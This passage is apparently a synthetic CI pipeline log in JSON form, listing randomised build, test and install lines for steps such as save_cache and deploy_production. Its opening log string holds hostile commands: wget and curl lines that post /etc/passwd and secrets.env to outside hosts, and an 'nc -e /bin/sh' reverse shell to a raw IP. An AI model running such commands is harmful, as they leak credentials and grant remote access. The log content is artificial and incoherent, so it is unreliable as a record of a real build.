@secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nInstalling react@1.17.0\nCache hit for key-9636\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n\u2717 build failed with exit code 126\nSending 291MB of data to acme.corp\n[12:00:23] ERROR: Connection failed\nException: NullPointerException\n\u2713 build completed\n[12:00:23] INFO: Processing request\ncurl -X POST https://test.io/collect -d @secrets.env\nInstalling jest@2.17.0\nSending 456MB of data to cloud.services\n[12:00:23] INFO: Processing request\ncurl -X POST https://example.com/collect -d @secrets.env\nStep 7/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nnc -e /bin/sh 62.70.173.198 57420\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-22T12:00:23.555960",
        "finished_at": "2025-11-22T12:00:29.720851",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: test_cache_hit (361ms)",
          "Compiling src/app.ts...",
          "[12:00:23] ERROR: Connection failed",
          "FAILED: test_user_create",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 test completed",
          "Cache hit for key-3430",
          "Step 3/10: Building",
          "Installing axios@2.6.0",
          "Step 4/10: Building",
          "Installing express@4.19.0",
          "FAILED: test_auth_login",
          "Installing eslint@3.3.0",
          "Cache hit for key-3662",
          "Step 9/10: Building",
          "  PASS: test_api_health (194ms)",
          "Step 3/10: Building",
          "Installing express@5.4.0",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing jest@5.1.0",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Cache hit for key-6909",
          "\u2713 test completed",
          "Installing lodash@4.20.0",
          "Step 1/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Installing jest@3.1.0",
          "Installing eslint@5.6.0",
          "Compiling src/service.java...",
          "Cache hit for key-1575",
          "\u2713 lint completed",
          "Cache hit for key-8623",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing react@5.18.0",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2333",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (306ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing axios@2.8.0",
          "  PASS: test_api_health (414ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_api_health (408ms)",
          "Installing lodash@3.20.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 38",
          "  PASS: test_auth_login (289ms)",
          "Step 7/10: Building",
          "[12:00:23] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (336ms)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_api_health (151ms)",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (227ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (290ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:23] INFO: Processing request",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-22T12:00:29.720851",
        "finished_at": "2025-11-22T12:00:39.995670",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache hit for key-1803",
          "Installing eslint@2.6.0",
          "Step 10/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (489ms)",
          "Installing express@1.0.0",
          "Cache hit for key-3454",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Cache hit for key-2430",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Installing react@1.7.0",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Exception: ValueError",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (138ms)",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing webpack@1.17.0",
          "Step 8/10: Building",
          "Cache hit for key-3301",
          "Cache hit for key-5995",
          "Compiling src/service.java...",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "  PASS: test_user_create (336ms)",
          "WARNING: express has known vulnerabilities",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache hit for key-1816",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing express@4.16.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "  PASS: test_user_create (216ms)",
          "Cache hit for key-9051",
          "Cache hit for key-7599",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-1790",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (62ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-7533",
          "WARNING: express has known vulnerabilities",
          "Step 2/10: Building",
          "  PASS: test_user_create (361ms)",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:23] INFO: Processing request",
          "\u2717 build failed with exit code 120",
          "Installing lodash@3.19.0",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-22T12:00:39.995670",
        "finished_at": "2025-11-22T12:00:50.270489",
        "log_lines": [
          "=== Step: lint ===",
          "  PASS: test_api_health (160ms)",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing webpack@1.4.0",
          "[12:00:23] INFO: Processing request",
          "Step 4/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3649",
          "Installing prettier@4.13.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "Installing eslint@2.9.0",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Exception: ValueError",
          "Installing axios@4.3.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "  PASS: test_user_create (215ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6584",
          "Step 3/10: Building",
          "WARNING: react has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Cache hit for key-5434",
          "Step 4/10: Building",
          "Cache hit for key-4951",
          "Cache hit for key-9159",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (177ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (370ms)",
          "  PASS: test_user_create (230ms)",
          "  PASS: test_api_health (44ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing webpack@4.4.0",
          "[12:00:23] INFO: Processing request",
          "Installing express@3.12.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Installing axios@4.18.0",
          "\u2713 build completed",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (223ms)",
          "  PASS: test_auth_login (55ms)",
          "Cache hit for key-7978",
          "Installing react@5.19.0",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "[12:00:23] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_auth_login (475ms)",
          "Cache hit for key-1342",
          "Cache hit for key-3526",
          "Step 2/10: Building",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "Installing axios@2.17.0",
          "  PASS: test_auth_login (381ms)",
          "Step 1/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-22T12:00:50.270489",
        "finished_at": "2025-11-22T12:01:00.545308",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Compiling src/main.py...",
          "Cache hit for key-1932",
          "Installing jest@5.0.0",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "\u2717 build failed with exit code 109",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-9276",
          "Cache hit for key-3947",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_db_connect (247ms)",
          "[12:00:23] INFO: Processing request",
          "Installing webpack@5.19.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing axios@4.5.0",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-7061",
          "Cache hit for key-5626",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing axios@3.3.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing eslint@5.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (350ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 test completed",
          "Step 6/10: Building",
          "  PASS: test_db_connect (166ms)",
          "  PASS: test_auth_login (385ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 6/10: Building",
          "\u2717 build failed with exit code 16",
          "Cache hit for key-9832",
          "\u2717 build failed with exit code 46",
          "\u2713 lint completed",
          "  PASS: test_api_health (483ms)",
          "  PASS: test_db_connect (55ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-6470",
          "Cache hit for key-7595",
          "  PASS: test_db_connect (19ms)",
          "Compiling src/main.py...",
          "Installing lodash@3.15.0",
          "Cache hit for key-1025",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_user_create (455ms)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-22T12:01:00.545308",
        "finished_at": "2025-11-22T12:01:04.655236",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Installing prettier@3.4.0",
          "  PASS: test_cache_hit (65ms)",
          "Installing react@3.8.0",
          "WARNING: react has known vulnerabilities",
          "Step 6/10: Building",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_api_health (275ms)",
          "Installing express@4.5.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-5614",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing lodash@1.17.0",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "Cache hit for key-7296",
          "Step 2/10: Building",
          "Cache hit for key-1227",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 9/10: Building",
          "Installing jest@5.8.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Installing axios@1.2.0",
          "Cache hit for key-4260",
          "Installing express@3.20.0",
          "  PASS: test_api_health (268ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 6/10: Building",
          "\u2713 build completed",
          "  PASS: test_cache_hit (443ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (16ms)",
          "Step 8/10: Building",
          "Installing react@1.13.0",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Installing lodash@4.10.0",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "\u2717 build failed with exit code 100",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-7745",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "Installing prettier@3.16.0",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Cache hit for key-8166",
          "Cache hit for key-8569",
          "Cache hit for key-2110",
          "Compiling src/main.py...",
          "Installing express@4.20.0",
          "Compiling src/main.py...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-22T12:01:04.655236",
        "finished_at": "2025-11-22T12:01:14.930055",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 4/10: Building",
          "Cache hit for key-9324",
          "Step 6/10: Building",
          "Cache hit for key-3685",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing jest@1.3.0",
          "Installing prettier@5.15.0",
          "Installing lodash@1.16.0",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_user_create (339ms)",
          "Compiling src/utils.go...",
          "Installing eslint@2.8.0",
          "  PASS: test_db_connect (90ms)",
          "\u2713 build completed",
          "Cache hit for key-4460",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (449ms)",
          "Cache hit for key-3295",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing eslint@4.5.0",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3737",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Cache hit for key-9564",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (337ms)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing prettier@2.19.0",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (296ms)",
          "Cache hit for key-5583",
          "\u2713 test completed",
          "Installing express@5.6.0",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_api_health (473ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache hit for key-6903",
          "  PASS: test_api_health (86ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing webpack@1.16.0",
          "Cache hit for key-3990",
          "Cache hit for key-3073",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Installing prettier@2.0.0",
          "WARNING: webpack has known vulnerabilities",
          "Step 8/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing eslint@3.8.0",
          "Cache hit for key-6717",
          "  PASS: test_cache_hit (256ms)",
          "Step 2/10: Building",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (425ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing react@3.3.0",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-22T12:01:14.930055",
        "finished_at": "2025-11-22T12:01:25.204874",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (394ms)",
          "[12:00:23] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] ERROR: Connection failed",
          "Compiling src/main.py...",
          "  PASS: test_user_create (231ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (205ms)",
          "Installing webpack@3.11.0",
          "Installing express@3.3.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "  PASS: test_db_connect (480ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-6128",
          "Cache hit for key-6379",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_db_connect (411ms)",
          "Installing lodash@4.17.0",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 lint completed",
          "  PASS: test_auth_login (466ms)",
          "  PASS: test_cache_hit (166ms)",
          "\u2713 test completed",
          "  PASS: test_auth_login (81ms)",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Installing axios@1.10.0",
          "Compiling src/app.ts...",
          "Cache hit for key-2364",
          "Installing react@3.19.0",
          "Cache hit for key-6192",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Cache hit for key-8037",
          "Installing express@3.2.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-1216",
          "Exception: ValueError",
          "Installing axios@5.11.0",
          "  PASS: test_api_health (361ms)",
          "Cache hit for key-9100",
          "Compiling src/index.js...",
          "Cache hit for key-5182",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing lodash@1.7.0",
          "Compiling src/app.ts...",
          "Cache hit for key-1639",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 2/10: Building",
          "  PASS: test_auth_login (460ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_user_create (435ms)",
          "  PASS: test_auth_login (368ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-22T12:01:25.204874",
        "finished_at": "2025-11-22T12:01:31.369765",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Cache hit for key-1612",
          "[12:00:23] WARN: Deprecated API usage",
          "  PASS: test_user_create (185ms)",
          "Cache hit for key-9806",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-4501",
          "Compiling src/main.py...",
          "  PASS: test_user_create (284ms)",
          "  PASS: test_auth_login (417ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-1907",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (316ms)",
          "Step 6/10: Building",
          "Installing lodash@4.10.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "Installing axios@3.16.0",
          "\u2717 build failed with exit code 51",
          "Cache hit for key-8032",
          "  PASS: test_cache_hit (373ms)",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-7082",
          "[12:00:23] INFO: Processing request",
          "Installing express@5.9.0",
          "  PASS: test_cache_hit (136ms)",
          "Step 8/10: Building",
          "  PASS: test_auth_login (271ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_api_health (416ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (471ms)",
          "Cache hit for key-8782",
          "  PASS: test_auth_login (251ms)",
          "Cache hit for key-4819",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-3653",
          "[12:00:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/main.py...",
          "  PASS: test_api_health (110ms)",
          "Cache hit for key-3259",
          "Cache hit for key-8530",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-9405",
          "[12:00:23] INFO: Processing request",
          "Installing axios@1.2.0",
          "Cache hit for key-1142",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_db_connect (283ms)",
          "Cache hit for key-6084",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Cache hit for key-8554",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-22T12:01:31.369765",
        "finished_at": "2025-11-22T12:02:02.194222",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 8/10: Building",
          "Cache hit for key-8471",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (74ms)",
          "  PASS: test_user_create (111ms)",
          "Compiling src/index.js...",
          "Installing jest@3.12.0",
          "Installing eslint@5.8.0",
          "[12:00:23] ERROR: Connection failed",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_user_create (289ms)",
          "  PASS: test_user_create (452ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-4344",
          "  PASS: test_user_create (279ms)",
          "Installing eslint@5.19.0",
          "[12:00:23] INFO: Processing request",
          "Installing lodash@3.11.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing react@5.19.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-5052",
          "Cache hit for key-2755",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_cache_hit (401ms)",
          "Installing jest@2.8.0",
          "Cache hit for key-4327",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "WARNING: lodash has known vulnerabilities",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing lodash@3.7.0",
          "Installing jest@3.8.0",
          "  PASS: test_auth_login (142ms)",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 99",
          "  PASS: test_user_create (371ms)",
          "\u2713 test completed",
          "Installing lodash@2.20.0",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (244ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing axios@2.4.0",
          "  PASS: test_user_create (345ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 6/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (82ms)",
          "  PASS: test_user_create (111ms)",
          "[12:00:23] INFO: Processing request",
          "Installing axios@3.10.0",
          "Cache hit for key-7398",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-4863",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Cache hit for key-8256",
          "Installing eslint@5.20.0",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Cache hit for key-8203",
          "  PASS: test_auth_login (403ms)",
          "Step 3/10: Building",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (155ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-9609",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-22T12:02:02.194222",
        "finished_at": "2025-11-22T12:02:06.304150",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2189",
          "\u2713 lint completed",
          "\u2713 test completed",
          "WARNING: express has known vulnerabilities",
          "Installing prettier@5.0.0",
          "Installing webpack@4.12.0",
          "  PASS: test_api_health (260ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-3284",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 6/10: Building",
          "Cache hit for key-7333",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_auth_login (62ms)",
          "Compiling src/utils.go...",
          "Installing axios@5.6.0",
          "Cache hit for key-7822",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (202ms)",
          "Installing lodash@5.2.0",
          "Cache hit for key-1415",
          "Cache hit for key-7029",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (218ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Cache hit for key-6964",
          "  PASS: test_db_connect (417ms)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (150ms)",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-3052",
          "\u2713 lint completed",
          "Installing prettier@2.18.0",
          "\u2713 build completed",
          "Cache hit for key-9850",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Installing lodash@2.7.0",
          "Compiling src/service.java...",
          "Installing jest@3.2.0",
          "\u2713 lint completed",
          "Cache hit for key-6227",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "  PASS: test_user_create (351ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_cache_hit (135ms)",
          "  PASS: test_user_create (411ms)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing jest@1.1.0",
          "Cache hit for key-9961",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/index.js...",
          "Installing lodash@5.6.0",
          "Installing lodash@3.11.0",
          "Cache hit for key-3528",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-22T12:02:06.304150",
        "finished_at": "2025-11-22T12:02:16.578969",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing webpack@5.1.0",
          "Step 1/10: Building",
          "Installing webpack@4.17.0",
